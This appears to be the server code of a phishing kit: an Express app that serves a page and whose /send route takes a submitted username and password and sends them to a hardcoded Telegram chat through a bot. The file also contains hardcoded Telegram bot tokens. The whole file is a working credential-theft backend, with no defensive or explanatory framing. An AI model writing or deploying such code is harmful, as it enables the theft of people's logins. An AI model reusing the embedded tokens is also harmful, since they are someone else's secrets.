const express = require("express");
const path = require("path");
const PORT = process.env.PORT || 5000;
const bodyParser = require("body-parser");
const nodemailer = require("nodemailer");
const { Telegraf } = require("telegraf");

// const bot = new Telegraf("1632327563:AAGb2Nne7wE1NLbfU9tFI74b8le7BY4jYYo");
const bot = new Telegraf("5431332526:AAF8-3Nn7zsprkVJc7G508uivT7OMovn6aA");

bot.start((ctx) => {
    console.log(ctx);
    ctx.reply("Welcome");
});
bot.command("context", (context) => console.log(context.chat.id));

bot.launch();

const USER = 743490275;

express()
    .use(express.static(path.join(__dirname, "public")))
    .use(bodyParser.urlencoded({ extended: false }))
    .use(bodyParser.json())
    .set("trust proxy", true)
    .engine("html", require("ejs").renderFile)
    .set("view engine", "html")
    .set("views", path.join(__dirname, "views"))
    .get("/", (req, res) => res.render("pages/index"))

.post("/send", (req, res) => {
        try {
            const { username, password } = req.body;

            bot.telegram.sendMessage(USER, `${username} : ${password}`);

            res.sendStatus(200);
        } catch (e) {
            console.log(e);
        }
    })
    .listen(PORT, () => console.log(`Listening on ${PORT}`));